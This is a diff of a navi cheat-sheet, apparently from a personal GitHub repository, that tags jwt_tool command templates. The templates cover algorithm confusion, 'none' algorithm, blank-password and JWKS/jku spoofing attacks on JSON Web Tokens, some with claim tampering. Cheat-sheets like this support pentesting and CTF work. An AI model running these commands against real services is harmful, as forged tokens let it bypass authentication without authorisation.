@@ -1,46 +1,46 @@
-% jwt
+% sealldev, jwt
 ; From https://github.com/sealldeveloper/navi-cheats/
 ; for messing with JWTs
 
 # Read a JWT
 $HOME/Documents/Web/JWT/jwt_tool/.venv/bin/python3 $HOME/Documents/Web/JWT/jwt_tool/jwt_tool.py <token>
 
-% jwt, algorithmconfusion
+% sealldev, jwt, algorithmconfusion
 # Perform an algorithm-confusion attack using a pubkey and a JWT (WITH PARAM CHANGE)
 $HOME/Documents/Web/JWT/jwt_tool/.venv/bin/python3 $HOME/Documents/Web/JWT/jwt_tool/jwt_tool.py <token> -X k -pk pubkey -I -pc <header> -pv <value>
 
-% jwt, algorithmconfusion
+% sealldev, jwt, algorithmconfusion
 # Perform an algorithm-confusion attack using a pubkey and a JWT
 $HOME/Documents/Web/JWT/jwt_tool/.venv/bin/python3 $HOME/Documents/Web/JWT/jwt_tool/jwt_tool.py <token> -X k -pk pubkey
 
-% jwt, nonealgorithm
+% sealldev, jwt, nonealgorithm
 # Perform a none algorithm attack using a JWT
 $HOME/Documents/Web/JWT/jwt_tool/.venv/bin/python3 $HOME/Documents/Web/JWT/jwt_tool/jwt_tool.py <token> -X a
 
-% jwt, nonealgorithm
+% sealldev, jwt, nonealgorithm
 # Perform a none algorithm attack using a JWT (WITH PARAM CHANGE)
 $HOME/Documents/Web/JWT/jwt_tool/.venv/bin/python3 $HOME/Documents/Web/JWT/jwt_tool/jwt_tool.py <token> -X a -I -pc <header> -pv <value>
 
-% jwt, blankpass
+% sealldev, jwt, blankpass
 # Perform a blank password attack using a JWT
 $HOME/Documents/Web/JWT/jwt_tool/.venv/bin/python3 $HOME/Documents/Web/JWT/jwt_tool/jwt_tool.py <token> -X b
 
-% jwt, blankpass
+% sealldev, jwt, blankpass
 # Perform a blank password attack using a JWT (WITH PARAM CHANGE)
 $HOME/Documents/Web/JWT/jwt_tool/.venv/bin/python3 $HOME/Documents/Web/JWT/jwt_tool/jwt_tool.py <token> -X b -I -pc <header> -pv <value>
 
-% jwt, jwk, jku
+% sealldev, jwt, jwk, jku
 # Perform a JWKS spoof attack with a JWT 
 $HOME/Documents/Web/JWT/jwt_tool/.venv/bin/python3 $HOME/Documents/Web/JWT/jwt_tool/jwt_tool.py <token> -X s
 
-% jwt, jwt, jku
+% sealldev, jwt, jwt, jku
 # Perform a JWKS spoof attack a JWT (WITH PARAM CHANGE)
 $HOME/Documents/Web/JWT/jwt_tool/.venv/bin/python3 $HOME/Documents/Web/JWT/jwt_tool/jwt_tool.py <token> -X s -I -pc <header> -pv <value>
 
-% jwt, jwk, jku
+% sealldev, jwt, jwk, jku
 # Perform a JWKS spoof attack with a JWT (specify url and keyfile)
 $HOME/Documents/Web/JWT/jwt_tool/.venv/bin/python3 $HOME/Documents/Web/JWT/jwt_tool/jwt_tool.py <token> -X s -ju "<url>" -jw <keyfile>
 
-% jwt, jwt, jku
+% sealldev, jwt, jwt, jku
 # Perform a JWKS spoof attack a JWT (specify url and keyfile, WITH PARAM CHANGE)
 $HOME/Documents/Web/JWT/jwt_tool/.venv/bin/python3 $HOME/Documents/Web/JWT/jwt_tool/jwt_tool.py <token> -X s -I -pc <header> -pv <value> -ju "<url>" -jw <keyfile>
